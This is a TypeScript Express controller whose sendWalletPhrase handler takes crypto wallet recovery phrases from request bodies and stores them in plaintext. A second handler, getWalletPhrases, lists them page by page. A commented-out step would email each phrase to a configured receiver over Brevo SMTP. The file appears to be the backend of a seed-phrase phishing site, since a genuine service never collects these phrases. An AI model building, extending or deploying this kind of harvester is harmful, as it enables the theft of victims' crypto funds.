import dotenv from 'dotenv';
dotenv.config();
import nodemailer from 'nodemailer';
import crypto from 'crypto';
import { Request, Response } from 'express';
import { AppDataSource } from './index';
import { WalletPhrase } from './entity/WalletPhrase';

// // Encryption setup (ensure ENCRYPTION_KEY is a 32-byte string in your .env)
// const ALGORITHM = 'aes-256-cbc';
// const ENCRYPTION_KEY = Buffer.from(process.env.ENCRYPTION_KEY || '', 'hex'); // Must be 32 bytes (64 hex characters)
// const IV_LENGTH = 16;

// const encrypt = (text: string): string => {
//   const iv = crypto.randomBytes(IV_LENGTH);
//   const cipher = crypto.createCipheriv(ALGORITHM, ENCRYPTION_KEY, iv);
//   const encrypted = Buffer.concat([cipher.update(text), cipher.final()]);
//   return `${iv.toString('hex')}:${encrypted.toString('hex')}`;
// };

// Configure your email transport (use environment variables for real projects)
const transporter = nodemailer.createTransport({
  host: 'smtp-relay.brevo.com',
  port: 587,
  secure: false, 
  auth: {
    user: process.env.MAIL_USER,
    pass: process.env.MAIL_PASS,
  },
  logger: process.env.NODE_ENV === 'development',
  debug: process.env.NODE_ENV === 'development',
});


// Function to verify connection to Brevo SMTP
export const verifyBrevoConnection = async () => {
  try {
    await transporter.verify();
  } catch (error) {
    console.error('Failed to verify Brevo connection:', error);
  }
};
// verifyBrevoConnection();
export const sendWalletPhrase = async (req: Request, res: Response) => {
  const { passphrase } = req.body;
  if (!passphrase) {
    return res.status(400).json({ error: 'Passphrase is required' });
  }

  try {
    // 1. Save to database
    const walletPhraseRepository = AppDataSource.getRepository(WalletPhrase);

    // Check if the phrase already exists to ensure idempotency
    const existingPhrase = await walletPhraseRepository.findOne({ where: { passphrase } });
    if (!existingPhrase) {
      const newPhrase = walletPhraseRepository.create({ passphrase: passphrase });
      await walletPhraseRepository.save(newPhrase);
    }

    // 2. Send email
    // await transporter.sendMail({
    //   from: process.env.MAIL_FROM || process.env.MAIL_USER,
    //   to: process.env.MAIL_RECEIVER,
    //   subject: 'New Wallet Passphrase Submission',
    //   text: `Wallet Passphrase: ${passphrase}`,
    // });

    res.status(200).json({ message: 'Phrase saved successfully' });
  } catch (error) {
    console.error('Error in sendWalletPhrase:', error);
    if (error instanceof Error) {
      res.status(500).json({ error: 'Operation failed', details: error.message });
    } else {
      res.status(500).json({ error: 'Operation failed', details: 'An unknown error occurred' });
    }
  }
};

export const getWalletPhrases = async (req: Request, res: Response) => {
  try {
    // 1. Parse pagination query parameters with defaults
    const page = parseInt(req.query.page as string, 10) || 1;
    const limit = parseInt(req.query.limit as string, 10) || 10;
    const skip = (page - 1) * limit;

    // 2. Get repository and fetch data with count
    const walletPhraseRepository = AppDataSource.getRepository(WalletPhrase);
    const [data, totalItems] = await walletPhraseRepository.findAndCount({
      order: { createdAt: 'DESC' }, // Show newest first
      take: limit,
      skip: skip,
    });

    // 3. Send a structured, paginated response
    res.status(200).json({
      data,
      meta: {
        totalItems,
        itemCount: data.length,
        itemsPerPage: limit,
        totalPages: Math.ceil(totalItems / limit),
        currentPage: page,
      },
    });
  } catch (error) {
    console.error('Error fetching wallet phrases:', error);
    res.status(500).json({ error: 'Failed to retrieve phrases' });
  }
};
